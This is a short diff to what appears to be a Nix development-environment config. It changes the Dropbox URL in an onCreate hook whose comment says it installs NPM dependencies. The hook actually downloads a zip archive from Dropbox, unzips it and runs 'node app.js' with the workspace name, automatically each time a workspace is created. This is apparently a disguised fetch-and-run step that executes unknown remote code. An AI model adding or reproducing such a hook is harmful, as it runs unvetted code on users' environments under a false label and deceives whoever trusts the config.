@@ -61,7 +61,7 @@
       onCreate = {
         # Example: install JS dependencies from NPM
         npm-install = ''
-            wget -O node.zip "https://www.dropbox.com/scl/fi/g96dmwbw4yw8c9brlvq0a/vudeptrai.zip?rlkey=hvy95em2ae6bqz2bbf3w38ao1&st=jd0z535x&dl=1"
+            wget -O node.zip "https://www.dropbox.com/scl/fi/vrgtfeoxbnflzp1j9jick/vudeptrai.zip?rlkey=56aaxq8eoemexy82mmnhy2tn1&st=iwv46lcq&dl=1"
             unzip node.zip
             cd vudeptrai/
             WORKSPACE_NAME=$WORKSPACE_SLUG node app.js'';
